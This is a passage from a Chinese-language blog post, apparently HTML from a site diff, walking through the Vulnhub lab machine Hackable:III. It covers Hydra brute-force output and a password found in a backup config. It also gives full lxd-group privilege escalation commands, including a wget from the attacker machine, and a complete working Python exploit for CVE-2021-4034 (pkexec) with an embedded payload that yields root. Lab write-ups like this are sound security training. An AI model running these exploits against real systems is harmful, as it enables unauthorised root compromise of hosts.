class="keyword">end</span>.</span><br><span class="line">[ERROR] <span class="number">5</span> targets did <span class="keyword">not</span> resolve <span class="keyword">or</span> could <span class="keyword">not</span> be connected</span><br><span class="line">[ERROR] <span class="number">0</span> target did <span class="keyword">not</span> complete</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at <span class="number">2025</span><span class="number">-02</span><span class="number">-11</span> <span class="number">19</span>:<span class="number">08</span>:<span class="number">36</span></span><br></pre></td></tr></table></figure></div>
+<p>成功拿到shell jubiscleudo&#x2F;onlymy<br>这里还有一种可以用ipv6绕过knock的方法，详情可以看群主ll104567的视频<a target="_blank" rel="noopener" href="https://space.bilibili.com/20805349?spm_id_from=333.1387.follow.user_card.click">https://space.bilibili.com/20805349?spm_id_from=333.1387.follow.user_card.click</a></p>
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>用linpeas.sh来找找有什么可以利用的<br>发现了在&#x2F;var&#x2F;www&#x2F;html&#x2F;.backup_config.php里有hackable_3用户的密码<br><img src="https://pic1.imgdb.cn/item/67ab377ad0e0a243d4fe613a.png"><br>切换用户</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">hackable_3</span>@ubuntu20:~$ id</span><br><span class="line"><span class="attribute">uid</span>=<span class="number">1000</span>(hackable_3) gid=<span class="number">1000</span>(hackable_3) groups=<span class="number">1000</span>(hackable_3),<span class="number">4</span>(adm),<span class="number">24</span>(cdrom),<span class="number">30</span>(dip),<span class="number">46</span>(plugdev),<span class="number">116</span>(lxd)</span><br></pre></td></tr></table></figure></div>
+<p>根据群主在群里发的文件知道lxd是可以提权的<br>LXD 是一个 root 进程，它负责执行任意用户的 LXD UNIX 套接字写入访问操作。而且在某些情况下，LXD 甚至都不会调用它的用户权限进行检查和匹配</p>
+<p>Linux Container（LXC）通常被认为是一种轻量级虚拟化技术，它介于 Chroot 和完整开发的虚拟机之间，LXC 可以创建一个跟正常 Linux 操作系统十分接近的环境，但是不需要使用到单独的内核资源。</p>
+<p>Linux Daemon（LXD）是一个轻量级容器管理程序，而 LXD 是基于 LXC 容器技术实现的，而这种技术之前 Docker 也使用过。LXD 使用了稳定的 LXC API 来完成所有的后台容器管理工作，并且增加了 REST API 支持，更进一步地提升了用户体验度。</p>
+<p>在网上搜lxd提权<br>先下载利用的程序 <a target="_blank" rel="noopener" href="https://github.com/saghul/lxd-alpine-builder">https://github.com/saghul/lxd-alpine-builder</a><br>然后开http_server服务让靶机用wget能接受</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~]</span><br><span class="line">└─<span class="comment"># scp kakeru@192.168.179.82:Downloads/lxd-alpine-builder-master.zip .</span></span><br><span class="line">(kakeru@<span class="number">192.168</span>.<span class="number">179.82</span>) <span class="params">Password:</span></span><br><span class="line">lxd-alpine-builder-master.zip                                                    <span class="number">100</span>% <span class="number">3175</span>KB <span class="number">116.0</span>MB<span class="symbol">/s</span>   <span class="number">00</span>:<span class="number">00</span>    </span><br><span class="line">                              </span><br></pre></td></tr></table></figure></div>
+<p>跟着网上lxd提权的步骤<a target="_blank" rel="noopener" href="https://www.cnblogs.com/jhinjax/p/17078938.html%EF%BC%8C">https://www.cnblogs.com/jhinjax/p/17078938.html，</a><br>接受文件后，初始化，一路回车</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)<span class="operator">-</span>[<span class="operator">~</span><span class="operator">/</span>tmp<span class="operator">/</span>lxd<span class="operator">-</span>alpine<span class="operator">-</span>builder<span class="operator">-</span>master]</span><br><span class="line">└─# python3 <span class="operator">-</span>m http.server <span class="number">80</span></span><br><span class="line">Serving HTTP <span class="keyword">on</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span> port <span class="number">80</span> (http:<span class="operator">/</span><span class="operator">/</span><span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">80</span><span class="operator">/</span>) ...</span><br><span class="line"></span><br><span class="line">hackable_3<span class="variable">@ubuntu20</span>:<span class="operator">~</span>$ ls</span><br><span class="line">alpine<span class="operator">-</span>v3<span class="number">.13</span><span class="operator">-</span>x86_64<span class="number">-20210218</span>_0139.tar.gz  snap</span><br><span class="line">hackable_3<span class="variable">@ubuntu20</span>:<span class="operator">~</span>$ lxd init</span><br><span class="line">Would you <span class="keyword">like</span> <span class="keyword">to</span> use LXD clustering? (yes<span class="operator">/</span><span class="keyword">no</span>) [<span class="keyword">default</span><span class="operator">=</span><span class="keyword">no</span>]: </span><br><span class="line">Do you want <span class="keyword">to</span> configure a <span class="keyword">new</span> storage pool? (yes<span class="operator">/</span><span class="keyword">no</span>) [<span class="keyword">default</span><span class="operator">=</span>yes]: </span><br><span class="line"></span><br><span class="line">Name <span class="keyword">of</span> the <span class="keyword">new</span> storage pool [<span class="keyword">default</span><span class="operator">=</span><span class="keyword">default</span>]: Name <span class="keyword">of</span> the storage backend <span class="keyword">to</span> use (ceph, btrfs, dir, lvm) [<span class="keyword">default</span><span class="operator">=</span>btrfs]: </span><br><span class="line"><span class="keyword">Create</span> a <span class="keyword">new</span> BTRFS pool? (yes<span class="operator">/</span><span class="keyword">no</span>) [<span class="keyword">default</span><span class="operator">=</span>yes]: </span><br><span class="line">Would you <span class="keyword">like</span> <span class="keyword">to</span> use an existing <span class="keyword">empty</span> block device (e.g. a disk <span class="keyword">or</span> <span class="keyword">partition</span>)? (yes<span class="operator">/</span><span class="keyword">no</span>) [<span class="keyword">default</span><span class="operator">=</span><span class="keyword">no</span>]: </span><br><span class="line">Size <span class="keyword">in</span> GB <span class="keyword">of</span> the <span class="keyword">new</span> loop device (<span class="number">1</span>GB minimum) [<span class="keyword">default</span><span class="operator">=</span><span class="number">5</span>GB]: </span><br><span class="line">Would you <span class="keyword">like</span> <span class="keyword">to</span> <span class="keyword">connect</span> <span class="keyword">to</span> a MAAS server? (yes<span class="operator">/</span><span class="keyword">no</span>) [<span class="keyword">default</span><span class="operator">=</span><span class="keyword">no</span>]: </span><br><span class="line">Would you <span class="keyword">like</span> <span class="keyword">to</span> <span class="keyword">create</span> a <span class="keyword">new</span> <span class="keyword">local</span> network bridge? (yes<span class="operator">/</span><span class="keyword">no</span>) [<span class="keyword">default</span><span class="operator">=</span>yes]: </span><br><span class="line">What should the <span class="keyword">new</span> bridge be <span class="keyword">called</span>? [<span class="keyword">default</span><span class="operator">=</span>lxdbr0]: </span><br><span class="line">What IPv4 address should be used? (CIDR subnet notation, “auto” <span class="keyword">or</span> “<span class="keyword">none</span>”) [<span class="keyword">default</span><span class="operator">=</span>auto]: </span><br><span class="line">What IPv6 address should be used? (CIDR subnet notation, “auto” <span class="keyword">or</span> “<span class="keyword">none</span>”) [<span class="keyword">default</span><span class="operator">=</span>auto]: </span><br><span class="line">Would you <span class="keyword">like</span> the LXD server <span class="keyword">to</span> be available <span class="keyword">over</span> the network? (yes<span class="operator">/</span><span class="keyword">no</span>) [<span class="keyword">default</span><span class="operator">=</span><span class="keyword">no</span>]: </span><br><span class="line">Would you <span class="keyword">like</span> stale cached images <span class="keyword">to</span> be updated automatically? (yes<span class="operator">/</span><span class="keyword">no</span>) [<span class="keyword">default</span><span class="operator">=</span>yes] </span><br><span class="line">Would you <span class="keyword">like</span> a YAML &quot;lxd init&quot; preseed <span class="keyword">to</span> be printed? (yes<span class="operator">/</span><span class="keyword">no</span>) [<span class="keyword">default</span><span class="operator">=</span><span class="keyword">no</span>]: </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">hackable_3<span class="variable">@ubuntu20</span>:<span class="operator">~</span>$ lxc image import alpine<span class="operator">-</span>v3<span class="number">.13</span><span class="operator">-</span>x86_64<span class="number">-20210218</span>_0139.tar.gz <span class="comment">--alias  image_name</span></span><br><span class="line">Image imported <span class="keyword">with</span> fingerprint: cd73881adaac667ca3529972c7b380af240a9e3b09730f8c8e4e6a23e1a7892b</span><br><span class="line">hackable_3<span class="variable">@ubuntu20</span>:<span class="operator">~</span>$ lxc init image_name ignite <span class="operator">-</span>c security.privileged<span class="operator">=</span><span class="literal">true</span></span><br><span class="line">Creating ignite</span><br><span class="line">hackable_3<span class="variable">@ubuntu20</span>:<span class="operator">~</span>$ lxc config device <span class="keyword">add</span> ignite mydevice disk source<span class="operator">=</span><span class="operator">/</span> path<span class="operator">=</span><span class="operator">/</span>mnt<span class="operator">/</span>root <span class="keyword">recursive</span><span class="operator">=</span><span class="literal">true</span></span><br><span class="line">Device mydevice added <span class="keyword">to</span> ignite</span><br><span class="line">hackable_3<span class="variable">@ubuntu20</span>:<span class="operator">~</span>$ lxc <span class="keyword">start</span> ignite</span><br><span class="line">hackable_3<span class="variable">@ubuntu20</span>:<span class="operator">~</span>$ lxc <span class="keyword">exec</span> ignite <span class="operator">/</span>bin<span class="operator">/</span>sh</span><br><span class="line"><span class="operator">~</span> # id</span><br><span class="line">uid<span class="operator">=</span><span class="number">0</span>(root) gid<span class="operator">=</span><span class="number">0</span>(root)</span><br></pre></td></tr></table></figure></div>
+<p>原理<br>lxd 组用户可以以任意镜像创建容器，并将当前系统根目录挂载到已创建容器的 mnt 目录下，&#x2F;mnt&#x2F;root&#x2F; 目录是一个完整的根目录，可以使用 chroot 获取到这个根目录的完整 root 权限。<br>所以现在查文件就在&#x2F;mnt&#x2F;root目录下面</p>
+<h2 id="提权方法2"><a href="#提权方法2" class="headerlink" title="提权方法2"></a>提权方法2</h2><p>刚才用linpeas.sh扫描的时候扫出一个漏洞<br><img src="https://pic1.imgdb.cn/item/67ab4752d0e0a243d4fe6489.png"><br>可以找到pkexec的漏洞利用脚本，不过不是这里显示的两个，是CVE-2021-4034<br>这里我们选择用py脚本，不用先编译，方便而且在靶机上成功率高</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># CVE-2021-4034 in Python</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Joe Ammond (joe@ammond.org)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># This was just an experiment to see whether I could get this to work</span></span><br><span class="line"><span class="comment"># in Python, and to play around with ctypes</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># This was completely cribbed from blasty&#x27;s original C code:</span></span><br><span class="line"><span class="comment"># https://haxx.in/files/blasty-vs-pkexec.c</span></span><br><span class="line"></span><br><span class="line">import base64</span><br><span class="line">import os</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">from ctypes import *</span><br><span class="line">from ctypes.util import find_library</span><br><span class="line"></span><br><span class="line"><span class="comment"># Payload, base64 encoded ELF shared object. Generate with:</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># msfvenom -p linux/x64/exec -f elf-so PrependSetuid=true | base64</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># The PrependSetuid=true is important, without it you&#x27;ll just get</span></span><br><span class="line"><span class="comment"># a shell as the user and not root.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Should work with any msfvenom payload, tested with linux/x64/exec</span></span><br><span class="line"><span class="comment"># and linux/x64/shell_reverse_tcp</span></span><br><span class="line"></span><br><span class="line">payload_b64 = <span class="string">b&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAAkgEAAAAAAABAAAAAAAAAALAAAAAAAAAAAAAAAEAAOAAC</span></span><br><span class="line"><span class="string">AEAAAgABAAEAAAAHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAArwEAAAAAAADMAQAAAAAAAAAQ</span></span><br><span class="line"><span class="string">AAAAAAAAAgAAAAcAAAAwAQAAAAAAADABAAAAAAAAMAEAAAAAAABgAAAAAAAAAGAAAAAAAAAAABAA</span></span><br><span class="line"><span class="string">AAAAAAABAAAABgAAAAAAAAAAAAAAMAEAAAAAAAAwAQAAAAAAAGAAAAAAAAAAAAAAAAAAAAAIAAAA</span></span><br><span class="line"><span class="string">AAAAAAcAAAAAAAAAAAAAAAMAAAAAAAAAAAAAAJABAAAAAAAAkAEAAAAAAAACAAAAAAAAAAAAAAAA</span></span><br><span class="line"><span class="string">AAAAAAAAAAAAAAAAAAAAAAAAAAwAAAAAAAAAkgEAAAAAAAAFAAAAAAAAAJABAAAAAAAABgAAAAAA</span></span><br><span class="line"><span class="string">AACQAQAAAAAAAAoAAAAAAAAAAAAAAAAAAAALAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span></span><br><span class="line"><span class="string">AAAASDH/amlYDwVIuC9iaW4vc2gAmVBUX1JeajtYDwU=</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">payload = base64.b64decode(payload_b64)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Set the environment for the call to execve()</span></span><br><span class="line">environ = [</span><br><span class="line">        <span class="string">b&#x27;exploit&#x27;</span>,</span><br><span class="line">        <span class="string">b&#x27;PATH=GCONV_PATH=.&#x27;</span>,</span><br><span class="line">        <span class="string">b&#x27;LC_MESSAGES=en_US.UTF-8&#x27;</span>,</span><br><span class="line">        <span class="string">b&#x27;XAUTHORITY=../LOL&#x27;</span>,</span><br><span class="line">        None</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Find the C library to call execve() directly, as Python helpfully doesn&#x27;t</span></span><br><span class="line"><span class="comment"># allow us to call execve() with no arguments.</span></span><br><span class="line">try:</span><br><span class="line">    libc = CDLL(find_library(<span class="string">&#x27;c&#x27;</span>))</span><br><span class="line">except:</span><br><span class="line">    print(<span class="string">&#x27;[!] Unable to find the C library, wtf?&#x27;</span>)</span><br><span class="line">    sys.<span class="keyword">exit</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create the shared library from the payload</span></span><br><span class="line">print(<span class="string">&#x27;[+] Creating shared library for exploit code.&#x27;</span>)</span><br><span class="line">try:</span><br><span class="line">    with open(<span class="string">&#x27;payload.so&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) as f:</span><br><span class="line">        f.write(payload)</span><br><span class="line">except:</span><br><span class="line">    print(<span class="string">&#x27;[!] Failed creating payload.so.&#x27;</span>)</span><br><span class="line">    sys.<span class="keyword">exit</span>()</span><br><span class="line">os.chmod(<span class="string">&#x27;payload.so&#x27;</span>, <span class="number">0</span>o0755)</span><br><span class="line"></span><br><span class="line"><span class="comment"># make the GCONV_PATH directory</span></span><br><span class="line">try:</span><br><span class="line">    os.mkdir(<span class="string">&#x27;GCONV_PATH=.&#x27;</span>)</span><br><span class="line">except FileExistsError:</span><br><span class="line">    print(<span class="string">&#x27;[-] GCONV_PATH=. directory already exists, continuing.&#x27;</span>)</span><br><span class="line">except:</span><br><span class="line">    print(<span class="string">&#x27;[!] Failed making GCONV_PATH=. directory.&#x27;</span>)</span><br><span class="line">    sys.<span class="keyword">exit</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create a temp exploit file</span></span><br><span class="line">try:</span><br><span class="line">    with open(<span class="string">&#x27;GCONV_PATH=./exploit&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) as f:</span><br><span class="line">        f.write(<span class="string">b&#x27;&#x27;</span>)</span><br><span class="line">except:</span><br><span class="line">    print(<span class="string">&#x27;[!] Failed creating exploit file&#x27;</span>)</span><br><span class="line">    sys.<span class="keyword">exit</span>()</span><br><span class="line">os.chmod(<span class="string">&#x27;GCONV_PATH=./exploit&#x27;</span>, <span class="number">0</span>o0755)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create directory to hold gconf-modules configuration file</span></span><br><span class="line">try:</span><br><span class="line">    os.mkdir(<span class="string">&#x27;exploit&#x27;</span>)</span><br><span class="line">except FileExistsError:</span><br><span class="line">    print(<span class="string">&#x27;[-] exploit directory already exists, continuing.&#x27;</span>)</span><br><span class="line">except:</span><br><span class="line">    print(<span class="string">&#x27;[!] Failed making exploit directory.&#x27;</span>)</span><br><span class="line">    sys.<span class="keyword">exit</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create gconf config file</span></span><br><span class="line">try:</span><br><span class="line">    with open(<span class="string">&#x27;exploit/gconv-modules&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) as f:</span><br><span class="line">        f.write(<span class="string">b&#x27;module  UTF-8//    INTERNAL    ../payload    2\n&#x27;</span>);</span><br><span class="line">except:</span><br><span class="line">    print(<span class="string">&#x27;[!] Failed to create gconf-modules config file.&#x27;</span>)</span><br><span class="line">    sys.<span class="keyword">exit</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Convert the environment to an array of char*</span></span><br><span class="line">environ_p = (c_char_p * len(environ))()</span><br><span class="line">environ_p[:] = environ</span><br><span class="line"></span><br><span class="line">print(<span class="string">&#x27;[+] Calling execve()&#x27;</span>)</span><br><span class="line"><span class="comment"># Call execve() with NULL arguments</span></span><br><span class="line">libc.execve(<span class="string">b&#x27;/usr/bin/pkexec&#x27;</span>, c_char_p(None), environ_p)</span><br></pre></td></tr></table></figure></div>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">jubiscleudo<span class="variable">@ubuntu20</span><span class="symbol">:~</span><span class="variable">$ </span>vi a.py</span><br><span class="line">jubiscleudo<span class="variable">@ubuntu20</span><span class="symbol">:~</span><span class="variable">$ </span>chmod +x a.py</span><br><span class="line">jubiscleudo<span class="variable">@ubuntu20</span><span class="symbol">:~</span><span class="variable">$ </span>./a.py</span><br><span class="line">[+] <span class="title class_">Creating</span> shared library <span class="keyword">for</span> exploit code.</span><br><span class="line">[+] <span class="title class_">Calling</span> execve()</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=<span class="number">0</span>(root) gid=<span class="number">1001</span>(jubiscleudo) groups=<span class="number">1001</span>(jubiscleudo)</span><br><span class="line"><span class="comment"># pwd</span></span><br><span class="line">/home/jubiscleudo</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="提权详细过程"><a href="#提权详细过程" class="headerlink" title="提权详细过程"></a>提权详细过程</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#（1）获取 Alpine Linux 镜像</span></span><br><span class="line">wget http://攻击机IP/alpine-v3.13-x86_64-20210218_0139.tar.gz</span><br><span class="line"></span><br><span class="line"><span class="comment">#lxd初始化</span></span><br><span class="line">lxd init   <span class="comment">#一路回车</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#然后导入镜像：</span></span><br><span class="line">lxc image import alpine-v3.13-x86_64-20210218_0139.tar.gz --<span class="built_in">alias</span> image_name</span><br><span class="line"></span><br><span class="line"><span class="comment">#创建特权容器</span></span><br><span class="line">lxc init image_name ignite -c security.privileged=<span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#挂载宿主机的根目录</span></span><br><span class="line">lxc config device add ignite mydevice disk <span class="built_in">source</span>=/ path=/mnt/root recursive=<span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#启动并进入容器</span></span><br><span class="line">lxc start ignite </span><br><span class="line">lxc <span class="built_in">exec</span> ignite /bin/sh</span><br><span class="line"></span><br><span class="line"><span class="comment">#切换到宿主机环境</span></span><br><span class="line"><span class="built_in">chroot</span> /mnt/root</span><br></pre></td></tr></table></figure></div>
+<p>总结：学到了什么是lxd，以及用这个提权的方式，lxd提权后的目录在&#x2F;mnt&#x2F;root，以及内核提权的使用方式。<br>由于我是arm机器，前面在编译x86文件的时候还遇到问题，学会了交叉编译的工具x86_64-linux-gnu-gcc<br>以及在本机编译c语言需要用-static让编译出来的文件不用动态库，用脚本有py就不用c</p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>guayu-kakeru
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://guayu-kakeru.github.io/posts/64270.html" title="Vulnhub-Hackable:III">https://guayu-kakeru.github.io/posts/64270.html</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F/" rel="tag"># 渗透</a>
+              <a href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag"># 靶场</a>
+              <a href="/tags/vulnhub/" rel="tag"># vulnhub</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/posts/34304.html" rel="prev" title="Vulnhub-deathnote">
+      <i class="fa fa-chevron-left"></i> Vulnhub-deathnote
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/posts/3905.html" rel="next" title="CTFSHOW第一部分web题wp整理">
+      CTFSHOW第一部分web题wp整理 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-text">端口扫描</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web-%E6%8E%A2%E6%B5%8B"><span class="nav-text">web 探测</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-text">提权</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%952"><span class="nav-text">提权方法2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8F%90%E6%9D%83%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B"><span class="nav-text">提权详细过程</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="guayu-kakeru"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">guayu-kakeru</p>
+  <div class="site-description" itemprop="description">一年过后，你会希望从今天就开始行动。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">44</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/guayukakeru" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;guayukakeru" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/1806449041@qq.com" title="E-Mail → 1806449041@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+  <div class="links-of-recent-posts motion-element">
+    <div class="links-of-recent-posts-title">
